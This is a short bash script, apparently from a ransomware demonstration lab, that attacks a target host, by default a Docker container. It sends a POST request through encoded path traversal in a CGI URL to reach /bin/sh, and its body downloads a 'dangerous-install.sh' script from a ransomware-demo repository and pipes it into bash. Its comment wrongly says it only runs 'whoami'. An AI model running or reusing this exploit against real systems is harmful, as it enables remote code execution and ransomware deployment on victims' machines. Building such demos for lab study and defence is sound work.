#!/usr/bin/env bash
if [[ -z $1 ]]; then
  TARGET=$(docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' ubuntu-01)
else
  TARGET=$1
fi;

# curl target with whoami command
curl -X POST --data 'echo;wget -q -O - https://github.com/yet-another-ransomware-demo/yet-another-ransomware-demo/raw/main/ransomware/scripts/dangerous-install.sh | bash' $TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh 
